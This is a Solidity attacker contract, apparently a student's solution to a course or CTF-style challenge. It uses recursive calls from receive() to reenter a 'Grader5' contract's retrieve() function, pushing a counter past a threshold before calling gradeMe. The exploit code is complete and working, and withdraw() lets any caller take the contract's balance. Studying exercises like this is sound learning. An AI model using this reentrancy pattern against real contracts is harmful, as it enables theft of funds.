// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

    /**
    * @title Interface for the Grader5 contract vulnerable to reentrancy
    * @notice Defines the minimum functions required to interact with Grader5
    * @dev This interface is used by the attacking contract to exploit the reentrancy vulnerability in Grader5
    */
interface IGrader5 {
    // @notice Executes an action with ether transfer and counter control
    function retrieve() external payable;

    /**
    * @notice Records a grade associated with a name
    * @param name The name of the student to be graded
    */
    function gradeMe(string calldata name) external;

    /**
    * @notice Check the interaction counter for an address
    * @param user The user's address
    * @return The current value of the counter
    */
    function counter(address user) external view returns (uint256);
}


    /**
    * @title Attacker contract exploiting a reentrancy vulnerability in Grader5
    * @author Freddy Brito 
    * @notice Executes controlled recursive calls to retrieve() to reach the rating threshold
    */
contract ReentrancyGraderAttacker {

    // --- State Variables ---

    // @notice Grader5 contract instance vulnerable
    IGrader5 public grader;

    // @notice Counter of reentries made from receive()
    uint256 public reentryCount;

    // @notice Flag to avoid infinite reentry
    bool public isReentering;

    // @notice Name temporarily stored for grading
    string public storedName;


     // --- Events ---

    /** 
    * @notice Issued when the attack has been completed
    * @param attacker Attacker's direction
    * @param name My name ;)
    */
    event AttackCompleted(address indexed attacker, string name);


    // --- Constructor ---

    /**
    * @notice Initializes the attacking contract with the address of Grader5
    * @param _graderAddress Grader5 Contract Address
    */
    constructor(address _graderAddress) payable {
        grader = IGrader5(_graderAddress);
    }


    // --- Core Logic Functions ---

    /**
    * @notice Special function that is executed when the contract receives Ether
    * @dev Executes up to two recursive calls to retrieve() during the attack
    */
    receive() external payable {
        if (!isReentering && reentryCount < 2) {
            isReentering = true;
            reentryCount++;
            grader.retrieve{value: 4}();
            isReentering = false;
        }
    }

    /**
    * @notice Execute the full attack: perform reentrancy and then qualify
    * @param name The name you wish to register in Grader5
    */
    function attack(string calldata name) external payable {
        require(msg.value >= 4, "Need at least 4 wei");

        storedName = name;
        reentryCount = 0;
        isReentering = false;

        // Initial call to retrieve; reentries are made in receive()
        grader.retrieve{value: 4}();

        // Validation to ensure the counter is sufficient
        require(grader.counter(address(this)) > 1, "Not enough counter");

        // Call gradeMe with the stored name
        grader.gradeMe(name);
        
        emit AttackCompleted(msg.sender, name);
    }

    // @notice Allows you to withdraw all funds accumulated in the attacking contract
    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
